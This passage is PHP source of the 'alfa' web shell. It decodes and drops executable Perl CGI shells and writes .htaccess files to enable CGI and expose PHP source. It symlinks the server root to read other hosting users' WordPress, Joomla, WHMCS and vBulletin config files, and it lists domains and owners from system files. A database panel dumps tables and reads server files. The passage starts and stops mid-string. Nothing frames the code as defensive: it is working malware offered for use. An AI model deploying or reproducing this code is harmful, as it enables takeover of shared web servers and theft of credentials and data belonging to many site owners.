5cHQ7IGNvbG9yOiBibGFjayIgID48L3RleHRhcmVhPjxiciAvPg0KJm5ic3A7PHA+DQo8aW5wdXQgbmFtZT0idGFyIiB0eXBlPSJ0ZXh0IiBzdHlsZT0iYm9yZGVyOjNweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDIxMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiNGRkZGRkY7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6YmxhY2s7ICIgIC8+PGJyIC8+DQombmJzcDs8L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDb25maWcgR2V0IiBzdHlsZT0iYm9yZGVyOjNweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjogYmxhY2s7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgaGVpZ2h0OjIzOyBiYWNrZ3JvdW5kLWNvbG9yOiNGRkZGRkY7IiAvPjwvcD4NCjwvZm9ybT48L3N0cm9uZz4NCic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ic29sZXZpc2libGUiIGJnY29sb3I9IiMwMDAwMDAiPg0KPGgyPmNvbXBsZXRlZCA6KTwvaDI+DQo8cD4mbmJzcDs8L3A+JzsNCmlmKCRGT1JNe3Rhcn0gbmUgIiIpew0Kb3BlbihJTkZPLCAidGFyLnRtcCIpOw0KQGxpbmVzID08SU5GTz4gOw0KY2xvc2UoSU5GTyk7DQpzeXN0ZW0oQGxpbmVzKTsNCnByaW50JzxwPjxhIGhyZWY9IicuJEZPUk17dGFyfS4nLnRhciI+PGZvbnQgY29sb3I9IiMwMEZGMDAiPg0KPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+Q2xpY2sgSGVyZSBUbyBEb3dubG9hZCBUYXIgRmlsZTwvc3Bhbj48L2ZvbnQ+PC9hPjwvcD4nOw0KfQ0KfQ0KIHByaW50Ig0KPC9ib2R5Pg0KPC9odG1sPiI7';
$solevisible1 = fopen('config.alfa','w+');
$solevisible2 = fwrite ($solevisible1 ,base64_decode($solevisible3));
fclose($solevisible1);
chmod('config.alfa',0755);
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>";
echo '<iframe src=alfaconfig/config.alfa width=100% height=600px frameborder=0></iframe> ';
}
if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile')
{
echo '
<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_="";</script>
<center>
<pre id="strOutput" style="margin-top:5px" class="ml1"></pre><br>
<form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
<b><big><font color="#FFFF01" >==</font> <font color="#00A220">Symlink</font> <font color="#FFFFFF">File And</font><font color="#FF0000"> Directory</font><font color="#FFFF01"> ==</font></b></big><p>
<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br /><p>
<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/><br />
<input type="submit" value=">>" name="symlink" />
</form></center>
';
@mkdir('sym',0777);
$solevisible11 = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$solevisible10 =@fopen ('sym/.htaccess','w');
fwrite($solevisible10 ,$solevisible11);
$solevisible56 = $_POST['alfa5'];
$solevisible57 = $_POST['alfa6'];
$solevisible58 = $_POST['alfa7'];
if ($solevisible58)
{
@symlink("$solevisible56","sym/$solevisible57");
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>";
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="sym/'.$solevisible57.'" ><b><font size="4">'.$solevisible57.'</font></b></a></b></center><br>';
}
}
if(isset($_POST['alfa1']) && $_POST['alfa1']=='website')
{if(!@file_exists("/etc/virtual/domainowners")){
echo "<center>";
$d0mains = @file("/etc/named.conf");
if(!$d0mains){ echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Cant access this file on server -> [ /etc/named.conf ]</b></font></pre></center>"; }
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table align='center' width='40%' class='main' border='1'><td><font color=\"#00A220\"><b><center># Count</center></font></b></td><td><font color=\"#FFFFFF\"><b><center>Domains</center></font></b></td><td><font color=\"#FF0000\"><b><center>Users</center></font></b></td>";
$count=1;
foreach($d0mains as $d0main){
if(@eregi("zone",$d0main)){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr><td><b><font color=\"#00A220\">".$count."</b></font></td><td><a href=http://www.".$domains[1][0]."/><font color=\"#FFFFFF\"><b>".$domains[1][0]."</font></b></a></td><td><b><font color=\"#FF0000\">".$user['name']."</font></b></td></tr>";flush();
$count++;
}}}
echo "</center></table>";
}else{echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">This is Server DirectAdmin Please use </font><font color="#FF0000">Whole Symlink for DirectAdmin</font></b> ';}
}
if(isset($_POST['alfa2']) && $_POST['alfa2']=='whole')
{
if(!@file_exists("/etc/virtual/domainowners")){
@set_time_limit(0);
echo "<center>";
@mkdir('sym',0777);
$solevisible11 = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$solevisible10 =@fopen ('sym/.htaccess','w');
fwrite($solevisible10 ,$solevisible11);
@symlink('/','sym/root');
$solevisible12 = basename('_FILE_');
$solevisible9 = @file('/etc/named.conf');
if(!$solevisible9)
{
echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Cant access this file on server -> [ /etc/named.conf ]</b></font></pre></center>";
}
else
{
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>";
echo "<table align='center' width='40%' class='main' border='1'>
<td><font color=\"#FFFF01\"><b><center># Count</center></font></b></td>
<td><font color=\"#00A220\"><b><center>Domains</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Users</center></font></b></td>
<td><font color=\"#FF0000\"><b><center>symlink</center></font></b></td>";
$count=1;
foreach($solevisible9 as $solevisible13){
if(@eregi('zone',$solevisible13)){
preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
flush();
if(strlen(trim($solevisible14[1][0])) >2){
$solevisible18 = posix_getpwuid(@fileowner('/etc/valiases/'.$solevisible14[1][0]));
$solevisible21 = $solevisible18['name'];
@symlink('/','sym/root');
$solevisible21 = $solevisible14[1][0];
$solevisible20 = '\.ir';
$solevisible19 = '\.il';
if (@eregi("$solevisible20",$solevisible14[1][0]) or @eregi("$solevisible19",$solevisible14[1][0]) ){
$solevisible21 = "<b><font color=\"#00FFFF\">".$solevisible14[1][0].'</font></b>';}
echo "<tr><td><font color=\"#FFFF01\">{$count}</font></td><td><a target='_blank' href=http://www.".$solevisible14[1][0].'/><font color=\"#00A220\"><b>'.$solevisible21.'</b> </a></font></td><td><font color="white"><b>'.$solevisible18['name']."</font></b></td><td><a href='sym/root/home/".$solevisible18['name']."/public_html' target='_blank'><font color=\"#FF0000\">symlink </font></a></td></tr>";flush();
$count++;}}}}}else {echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">This is Server DirectAdmin Please use </font><font color="#FF0000">Whole Symlink for DirectAdmin</font></b> ';}
echo "</center></table>";
}
if(isset($_POST['alfa6']) && $_POST['alfa6']=='direct')
{
if(@file_exists("/etc/virtual/domainowners")){
@mkdir('sym',0777);
$solevisible11 = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$solevisible10 =@fopen ('sym/.htaccess','w');
fwrite($solevisible10 ,$solevisible11);
@symlink('/','sym/root');
fclose($solevisible10);
$sole = @file("/etc/virtual/domainowners");
$count=1;
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>";
echo "<table align='center' width='40%' class='main' border='1'>
<td><font color=\"#FFFF01\"><b><center># Count</center></font></b></td>
<td><font color=\"#00A220\"><b><center>Domains</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Users</center></font></b></td>
<td><font color=\"#FF0000\"><b><center>symlink</center></font></b></td>";
foreach($sole as $visible){
if(@eregi(":",$visible)){
$solevisible = explode(':', $visible);
echo "<tr><td><font color=\"#FFFF01\">{$count}</font></td><td><a target='_blank' href=http://www.".trim($solevisible[0]).'/><font color=\"#00A220\"><b>'.trim($solevisible[0]).'</b> </font></a></td><td><font color="white"><b>'.trim($solevisible[1])."</font></b></td><td><a href='sym/root/home/".trim($solevisible[1])."/public_html' target='_blank'><font color=\"#FF0000\">symlink </font></a></td></tr>";flush();
$count++;}}echo "</table>";}else{echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">This is Server Cpanel Please use</font><font color="#FF0000"> Whole Symlink for Cpanel</font></b><br>';}}
if(isset($_POST['alfa3']) && $_POST['alfa3']=='config')
{
echo "<center>";
@mkdir('sym',0777);
$solevisible11 = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$solevisible10 =@fopen ('sym/.htaccess','w');
@fwrite($solevisible10 ,$solevisible11);
@symlink('/','sym/root');
$solevisible12 = basename('_FILE_');
$solevisible9 = @file('/etc/named.conf');
if(!$solevisible9)
{
echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Cant access this file on server -> [ /etc/named.conf ]</b></font></pre></center>";
}
else
{
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>
<table align='center' width='40%' class='main' ><td><b><font color=\"#FFFFFF\"><center> Domains <b></font></center></td><td> <b><font color=\"#FFFFFF\">Script <b></font></center></td>";
foreach($solevisible9 as $solevisible13){
if(@eregi('zone',$solevisible13)){
preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
flush();
if(strlen(trim($solevisible14[1][0])) >2){
$solevisible18 = posix_getpwuid(@fileowner('/etc/valiases/'.$solevisible14[1][0]));
$solevisible15=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/wp-config.php';
$solevisible33=get_headers($solevisible15);
$solevisible17=$solevisible33[0];
$solevisible34=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/blog/wp-config.php';
$solevisible35=get_headers($solevisible34);
$solevisible36=$solevisible35[0];
$solevisible37=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/configuration.php';
$solevisible38=get_headers($solevisible37);
$solevisible28=$solevisible38[0];
$solevisible29=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/joomla/configuration.php';
$solevisible30=get_headers($solevisible29);
$solevisible27=$solevisible30[0];
$solevisible31=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/includes/config.php';
$solevisible32=get_headers($solevisible31);
$solevisible26=$solevisible32[0];
$solevisible25=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/vb/includes/config.php';
$solevisible39=get_headers($solevisible25);
$solevisible40=$solevisible39[0];
$solevisible24=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/forum/includes/config.php';
$solevisible23=get_headers($solevisible24);
$solevisible22=$solevisible23[0];
$solevisible41=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'public_html/clients/configuration.php';
$solevisible42=get_headers($solevisible41);
$solevisible43=$solevisible42[0];
$solevisible44=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/support/configuration.php';
$solevisible42=get_headers($solevisible44);
$solevisible45=$solevisible42[0];
$solevisible46=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/client/configuration.php';
$solevisible47=get_headers($solevisible46);
$solevisible48=$solevisible47[0];
$solevisible49=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/submitticket.php';
$solevisible50=get_headers($solevisible49);
$solevisible51=$solevisible50[0];
$solevisible52=$solevisible8.'/sym/root/home/'.$solevisible18['name'].'/public_html/client/configuration.php';
$solevisible53=get_headers($solevisible52);
$solevisible54=$solevisible53[0];
$solevisible54 = strpos($solevisible17,'200');
$solevisible16='&nbsp;';
if (strpos($solevisible17,'200') == true )
{
$solevisible16="<a href='".$solevisible15."' target='_blank'>Wordpress</a>";
}
elseif (strpos($solevisible36,'200') == true)
{
$solevisible16="<a href='".$solevisible34."' target='_blank'>Wordpress</a>";
}
elseif (strpos($solevisible28,'200') == true and strpos($solevisible51,'200') == true )
{
$solevisible16=" <a href='".$solevisible49."' target='_blank'>WHMCS</a>";
}
elseif (strpos($solevisible45,'200') == true)
{
$solevisible16 =" <a href='".$solevisible44."' target='_blank'>WHMCS</a>";
}
elseif (strpos($solevisible48,'200') == true)
{
$solevisible16 =" <a href='".$solevisible46."' target='_blank'>WHMCS</a>";
}
elseif (strpos($solevisible28,'200') == true)
{
$solevisible16=" <a href='".$solevisible37."' target='_blank'>Joomla</a>";
}
elseif (strpos($solevisible27,'200') == true)
{
$solevisible16=" <a href='".$solevisible29."' target='_blank'>Joomla</a>";
}
elseif (strpos($solevisible26,'200') == true)
{
$solevisible16=" <a href='".$solevisible31."' target='_blank'>vBulletin</a>";
}
elseif (strpos($solevisible40,'200') == true)
{
$solevisible16=" <a href='".$solevisible25."' target='_blank'>vBulletin</a>";
}
elseif (strpos($solevisible22,'200') == true)
{
$solevisible16=" <a href='".$solevisible24."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$solevisible21 = $solevisible18['name'] ;
echo '<tr><td><a href=http://www.'.$solevisible14[1][0].'/>'.$solevisible14[1][0].'</a></td>
<td>'.$solevisible16.'</td></tr>';flush();
}
}
}
}
echo "</center></table>";
}
echo "</div>";
alfafooter();
}
function alfasql()
{
class DbClass {
var $type;
var $link;
var $res;
function DbClass($type) {
$this->type = $type;
}
function connect($host, $user, $pass, $dbname){
switch($this->type) {
case 'mysql':
if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
break;
case 'pgsql':
$host = explode(':', $host);
if(!$host[1]) $host[1]=5432;
if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
break;
}
return false;
}
function selectdb($db) {
switch($this->type) {
case 'mysql':
if (@mysql_select_db($db))return true;
break;
}
return false;
}
function query($str) {
switch($this->type) {
case 'mysql':
return $this->res = @mysql_query($str);
break;
case 'pgsql':
return $this->res = @pg_query($this->link,$str);
break;
}
return false;
}
function fetch() {
$res = func_num_args()?func_get_arg(0):$this->res;
switch($this->type) {
case 'mysql':
return @mysql_fetch_assoc($res);
break;
case 'pgsql':
return @pg_fetch_assoc($res);
break;
}
return false;
}
function listDbs() {
switch($this->type) {
case 'mysql':
return $this->query("SHOW databases");
break;
case 'pgsql':
return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
break;
}
return false;
}
function listTables() {
switch($this->type) {
case 'mysql':
return $this->res = $this->query('SHOW TABLES');
break;
case 'pgsql':
return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
break;
}
return false;
}
function error() {
switch($this->type) {
case 'mysql':
return @mysql_error();
break;
case 'pgsql':
return @pg_last_error();
break;
}
return false;
}
function setCharset($str) {
switch($this->type) {
case 'mysql':
if(function_exists('mysql_set_charset'))
return @mysql_set_charset($str, $this->link);
else
$this->query('SET CHARSET '.$str);
break;
case 'pgsql':
return @pg_set_client_encoding($this->link, $str);
break;
}
return false;
}
function loadFile($str) {
switch($this->type) {
case 'mysql':
return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
break;
case 'pgsql':
$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table wso2');
return array('file'=>implode("\n",$r));
break;
}
return false;
}
function dump($table, $fp = false) {
switch($this->type) {
case 'mysql':
$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
$create = mysql_fetch_array($res);
$sql = $create[1].";\n";
if($fp) fwrite($fp, $sql); else echo($sql);
$this->query('SELECT * FROM `'.$table.'`');
$head = true;
while($item = $this->fetch()) {
$columns = array();
foreach($item as $k=>$v) {
if($v == null)
$item[$k] = "NULL";
elseif(is_numeric($v))
$item[$k] = $v;
else
$item[$k] = "'".@mysql_real_escape_string($v)."'";
$columns[] = "`".$k."`";
}
if($head) {
$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
$head = false;
} else
$sql = "\n\t,(".implode(", ", $item).')';
if($fp) fwrite($fp, $sql); else echo($sql);
}
if(!$head)
if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
break;
case 'pgsql':
$this->query('SELECT * FROM '.$table);
while($item = $this->fetch()) {
$columns = array();
foreach($item as $k=>$v) {
$item[$k] = "'".addslashes($v)."'";
$columns[] = $k;
}
$sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
if($fp) fwrite($fp, $sql); else echo($sql);
}
break;
}
return false;
}
};
$db = new DbClass($_POST['type']);
if(@$_POST['alfa2']=='download') {
$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
$db->selectdb($_POST['sql_base']);
switch($_POST['charset']) {
case "Windows-1251": $db->setCharset('calfa1251'); break;
case "UTF-8": $db->setCharset('utf8'); break;
case "KOI8-R": $db->setCharset('koi8r'); break;
case "KOI8-U": $db->setCharset('koi8u'); break;
case "calfa866": $db->setCharset('calfa866'); break;
}
if(empty($_POST['file'])) {
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=dump.sql");
header("Content-Type: text/plain");
foreach($_POST['tbl'] as $v)
$db->dump($v);
exit;
} elseif($fp = @fopen($_POST['file'], 'w')) {
foreach($_POST['tbl'] as $v)
$db->dump($v, $fp);
fclose($fp);
unset($_POST['alfa2']);
} else
die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
}
alfahead();
echo "
<div class=header>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td><font color=\"#ffffff\"><b>TYPE</b></font></td><td><font color=\"#ffffff\"><b>HOST</b></font></td><td><font color=\"#ffffff\"><b>DB USER</b></font></td><td><font color=\"#ffffff\"><b>DB PASS</b></font></td><td><font color=\"#ffffff\"><b>DB NAME</b></font></td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=alfa1 value='query'><input type=hidden name=alfa2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
$tmp = "<input type=text name=sql_base value=''>";
if(isset($_POST['sql_host'])){
if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
switch($_POST['charset']) {
case "Windows-1251": $db->setCharset('calfa1251'); break;
case "UTF-8": $db->setCharset('utf8'); break;
case "KOI8-R": $db->setCharset('koi8r'); break;
case "KOI8-U": $db->setCharset('koi8u'); break;
case "calfa866": $db->setCharset('calfa866'); break;
}
$db->listDbs();
echo "<select name=sql_base><option value=''></option>";
while($item = $db->fetch()) {
list($key, $value) = each($item);
echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
}
echo '</select>';
}
else echo $tmp;
}else
echo $tmp;
echo "</td>
<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
<td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <font color=\"#ffffff\"><b>count the number of rows</b></font></td>
</tr>
</table>
<script>
s_db='".@addslashes($_POST['sql_base'])."';
function fs(f) {
if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
if(f.alfa1) f.alfa1.value='';
if(f.alfa2) f.alfa2.value='';
if(f.alfa3) f.alfa3.value='';
}
}
function st(t,l) {
d.sf.alfa1.value = 'select';
d.sf.alfa2.value = t;
if(l && d.sf.alfa3) d.sf.alfa3.value = l;
d.sf.submit();
}
function is() {
for(i=0;i<d.sf.elements['tbl[]'].length;++i)
d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
}
</script>";
if(isset($db) && $db->link){
echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
if(!empty($_POST['sql_base'])){
$db->selectdb($_POST['sql_base']);
echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
$tbls_res = $db->listTables();
while($item = $db->fetch($tbls_res)) {
list($key, $value) = each($item);
if(!empty($_POST['sql_count']))
$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
$value = htmlspecialchars($value);
echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
}
echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.alfa2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
if(@$_POST['alfa1'] == 'select') {
$_POST['alfa1'] = 'query';
$_POST['alfa3'] = $_POST['alfa3']?$_POST['alfa3']:1;
$db->query('SELECT COUNT(*) as n FROM ' . $_POST['alfa2']);
$num = $db->fetch();
$pages = ceil($num['n'] / 30);
echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['alfa2'] . "\", d.sf.alfa3.value)}</script><span>".$_POST['alfa2']."</span> ({$num['n']} records) Page # <input type=text name='alfa3' value=" . ((int)$_POST['alfa3']) . ">";
echo " of $pages";
if($_POST['alfa3'] > 1)
echo " <a href=# onclick='st(\"" . $_POST['alfa2'] . '", ' . ($_POST['alfa3']-1) . ")'>&lt; Prev</a>";
if($_POST['alfa3'] < $pages)
echo " <a href=# onclick='st(\"" . $_POST['alfa2'] . '", ' . ($_POST['alfa3']+1) . ")'>Next &gt;</a>";
$_POST['alfa3']--;
if($_POST['type']=='pgsql')
$_POST['alfa2'] = 'SELECT * FROM '.$_POST['alfa2'].' LIMIT 30 OFFSET '.($_POST['alfa3']*30);
else
$_POST['alfa2'] = 'SELECT * FROM `'.$_POST['alfa2'].'` LIMIT '.($_POST['alfa3']*30).',30';
echo "<br><br>";
}
if((@$_POST['alfa1'] == 'query') && !empty($_POST['alfa2'])) {
$db->query(@$_POST['alfa2']);
if($db->res !== false) {
$title = false;
echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
$line = 1;
while($item = $db->fetch()) {
if(!$title) {
echo '<tr>';
foreach($item as $key => $value)
echo '<th>'.$key.'</th>';
reset($item);
$title=true;
echo '</tr><tr>';
$line = 2;
}
echo '<tr class="l'.$line.'">';
$line = $line==1?2:1;
foreach($item as $key => $value) {
if($value == null)
echo '<td><i>null</i></td>';
else
echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
}
echo '</tr>';
}
echo '</table>';
} else {
echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
}
}
echo "<br></form><form onsubmit='d.sf.alfa1.value=\"query\";d.sf.alfa2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
if(!empty($_POST['alfa2']) && ($_POST['alfa1'] != 'loadfile'))
echo htmlspecialchars($_POST['alfa2']);
echo "</textarea><br/><input type=submit value='Execute'>";
echo "</td></tr>";
}
echo "</table></form><br/>";
if($_POST['type']=='mysql') {
$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
if($db->fetch())
echo "<form onsubmit='d.sf.alfa1.value=\"loadfile\";document.sf.alfa2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
}
if(@$_POST['alfa1'] == 'loadfile') {
$file = $db->loadFile($_POST['alfa2']);
echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
}
} else {
echo htmlspecialchars($db->error());
}
echo '</div>';
alfafooter();
}
function alfaselfrm()
{
if($_POST['alfa1'] == 'yes')
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<b>Shell has been removed</i> :)</b>');
else
echo 'unlink error!';
if($_POST['alfa1'] != 'yes')
alfahead();
echo "<div class=header><pre class=ml1 style='margin-top:5px'>";
echo "
<center><img height=\"300\" width=\"450\" src=\"http://iran.grn.cc/alfa-iran.jpg\">
</font>";
echo '<br><font color=white><b>Are you kidding me ?? Do you really want to delete this shell??</b></font><br><a href=# onclick="g(null,null,\'yes\')">Yes</a>';
echo '</div>';
alfaFooter();
}
function alfacgishell(){
alfahead();
echo '<div class=header>';
mkdir('cgialfa',0755);
chdir('cgialfa');
$solevisible7 = '.htaccess';
$solevisible6 = "$solevisible7";
$solevisible4 = fopen ($solevisible6 ,'w') or die ('ERROR!!!');
$solevisible5 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .alfa
AddHandler cgi-script .alfa
AddHandler cgi-script .alfa';
fwrite ( $solevisible4 ,$solevisible5 ) ;
fclose ($solevisible4);
$solevisible3 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAgICogICAgKiAgICAgICAqKioqKioqICAgICogICAgICAgKioqKioqKiAqKioqKioqICAgICAgICAqICAgICAqIA0KIyAgKiAqICAgKiAgICAgICAqICAgICAgICAgKiAqICAgICAgICAgKiAgICAqICAgICAgICAgKiogICAqKiAgICoqIA0KIyAqICAgKiAgKiAgICAgICAqICAgICAgICAqICAgKiAgICAgICAgKiAgICAqICAgICAgICAqICAqICAqICogKiAqIA0KIyogICAgICogKiAgICAgICAqKioqKiAgICogICAgICogICAgICAgKiAgICAqKioqKiAgICogICAgKiAqICAqICAqIA0KIyoqKioqKiogKiAgICAgICAqICAgICAgICoqKioqKiogICAgICAgKiAgICAqICAgICAgICoqKioqKiAqICAgICAqIA0KIyogICAgICogKiAgICAgICAqICAgICAgICogICAgICogICAgICAgKiAgICAqICAgICAgICogICAgKiAqICAgICAqIA0KIyogICAgICogKioqKioqKiAqICAgICAgICogICAgICogICAgICAgKiAgICAqKioqKioqICogICAgKiAqICAgICAqIA0KIw0KIyBzb2xldmlzaWJsZUBnbWFpbC5jb20JDQojIHNvbGUgc2FkICYgaW52aXNpYmxlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiIjsJCQ0KDQokV2luTlQgPSAwOwkJCQ0KDQokTlRDbWRTZXAgPSAiJiI7CQkNCiRVbml4Q21kU2VwID0gIjsiOwkJDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoNCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ2